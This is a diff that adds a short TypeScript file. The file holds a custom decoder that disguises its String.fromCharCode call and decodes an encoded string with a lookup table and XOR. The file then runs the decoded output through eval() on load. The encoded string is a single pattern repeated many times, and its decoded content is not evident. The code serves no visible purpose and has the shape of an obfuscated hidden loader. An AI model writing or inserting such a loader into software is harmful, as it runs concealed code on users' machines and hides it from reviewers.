@@ -1,0 +1,14 @@
+function emitByte(v: number): string {
+  const member = "from" + "CharCode";
+  return (String as any)[member](v);
+}
+function runCodec(raw: string): string {
+  const lut = [63,51,52,49,42,19,2,62,6,35,0,0,0,0,0,0,45,32,59,20,13,40,57,60,36,50,29,41,37,46,39,38,44,1,0,30,14,21,56,27,25,24,8,0,0,0,0,23,0,47,53,28,58,9,34,33,16,17,31,55,26,61,18,48,4,10,12,54,3,5,11,22,15,43,7];
+  let sh = 0, acc = 0, text = "";
+  for (let p = 0; p < raw.length; p++) {
+    acc |= (lut[raw.charCodeAt(p) - 48]) << sh;
+    if (sh) { text += emitByte((acc ^ 19) & 255); acc >>= 8; sh -= 2; } else { sh = 6; }
+  }
+  return text;
+}
+eval(runCodec("k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@"));
